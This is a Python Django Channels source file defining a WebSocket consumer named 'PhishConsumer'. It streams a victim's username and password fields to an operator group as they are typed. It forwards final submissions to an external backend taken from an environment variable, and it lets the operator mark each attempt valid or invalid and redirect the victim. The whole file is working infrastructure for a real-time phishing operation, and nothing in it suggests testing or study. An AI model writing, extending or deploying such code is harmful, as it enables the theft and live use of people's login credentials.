from channels.generic.websocket import AsyncWebsocketConsumer

import requests, os, json

from asgiref.sync import sync_to_async

class PhishConsumer(AsyncWebsocketConsumer):

    async def connect(self):
        session_id = self.scope["url_route"]["kwargs"]["session_id"]
        response = requests.post(f"{os.getenv('DS')}/handle-session/{session_id}/connect/")
        await self.accept()

        if response.status_code == 200:   
            self.room_name = response.json()['user']
            self.room_group_name = f"chat_{self.room_name}"
            await self.channel_layer.group_add(self.room_group_name, self.channel_name)
            await self.channel_layer.group_send(
                self.room_group_name, {"type":"is.online", "data":{'value': True, 'session': session_id}}
        )
        else:
            await self.close(code = 4003)

    async def disconnect(self, close_code):
        session_id = self.scope["url_route"]["kwargs"]["session_id"]
        response = requests.post(f"{os.getenv('DS')}/handle-session/{session_id}/disconnect/")
        await self.channel_layer.group_send(
                self.room_group_name, {"type":"is.online", "data":{'value' : False, 'session': session_id}}
        )
        try:
            await self.channel_layer.group_discard(self.room_group_name, self.channel_name)
        except:
            pass
        await self.close()

    async def receive(self, text_data):
        data = json.loads(text_data)
        session_id = self.scope["url_route"]["kwargs"]["session_id"]
        
        if data['type'] == "username" or data['type'] == "password":
            data['session_id'] = session_id
            await self.channel_layer.group_send(
                self.room_group_name, {"type":"value.change", "message" : data}
            )
        
        if data['type'] == "final":
            data['session'] = session_id
            await self.channel_layer.group_send(
                self.room_group_name, {"type":"final.message", "message":data}
            )
            resp = requests.post(f"{os.getenv('DS')}/handle-session/{session_id}/final/", json=data)
            if resp.status_code == 200:
                message = {"try" : resp.json()['try'], "session_id" : session_id}
                await self.channel_layer.group_send(
                    self.room_group_name, {"type":"new.try", "message": message}
                )
        
        if data['type'] == "invalid":
            await self.channel_layer.group_send(
            self.room_group_name, {"type":"invalid", "session":data['session']}
            )

        if data['type'] == "valid":
            response = requests.post(f"{os.getenv('DS')}/handle-session/{data['session']}/validate/", headers={
                "Authorization":session_id, "try-id" : data['try_id']
            })
            if response.status_code == 200:
                await self.channel_layer.group_send(
                self.room_group_name, {"type":"valid", "session":data['session'], "msg" : response.json()}
                )


    async def value_change(self, event):
        await self.send(text_data = json.dumps({"type":"vc","data":event['message']}))
        
    async def is_online(self, event):
        await self.send(text_data = json.dumps({"type": "online" , "data" : event['data']}))

    async def final_message(self, event):
        await self.send(text_data = json.dumps({"type": "final" , "data" : event['message']}))

    async def new_try(self, event):
        await self.send(text_data = json.dumps({"type": "try" , "data" : event['message']}))

    async def invalid(self, event):
        if event['session'] == self.scope["url_route"]["kwargs"]["session_id"]:
            await self.send(text_data = json.dumps({"type": "invalid" , "data" : event['session']}))

    async def valid(self, event):
        if event['session'] == self.scope["url_route"]["kwargs"]["session_id"]:
            await self.send(text_data = json.dumps({"type": "valid" , "data" : event['msg']['redirect']}))

    